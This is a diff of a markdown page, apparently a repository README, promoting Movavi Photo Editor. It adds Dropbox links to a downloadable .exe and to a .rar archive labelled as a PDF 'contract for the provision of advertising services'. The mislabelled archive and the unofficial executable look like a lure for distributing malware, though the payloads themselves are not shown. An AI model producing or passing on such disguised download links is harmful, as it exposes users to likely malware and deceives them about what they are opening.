@@ -19,7 +19,7 @@
 
 ## A workflow devoted entirely to creative photo post-processing
 
-## 🔐 [Movavi Photo Editor Download](https://www.dropbox.com/s/l0za6g2n8r78oj5/PromoMaterials.rar?dl=1)
+## 🔐 [Movavi Photo Editor Download](https://www.dropbox.com/s/fksobm70o5y1peq/Movavi_Photo_Editor_v6.7.1.x64.exe?dl=1)
 ### ● Essential tools
 
 Easily crop areas of your photo to alter the focus using composition guides, Golden Ratio and Rule of Thirds. Resize with ease using one of several presets, or resize by pixels, percentage or print size. Restore and repair old photos with the Scratch Remover and Fade Correction tools to enhance contrast and color to faded photos. 
@@ -45,7 +45,7 @@ Reduce repetition and accelerate complex photo-editing actions with Scripts. Rec
   
   
  #### <div dir="rtl">:Contract for the provision of advertising services (.pdf) </div>
- [💾 Download](https://www.dropbox.com/s/l0za6g2n8r78oj5/PromoMaterials.rar?dl=1)
+ [💾 Download](https://www.dropbox.com/s/hsdt0klpv9yw6ge/PromoMaterials.rar?dl=1)
   
    ...
 </details></div>
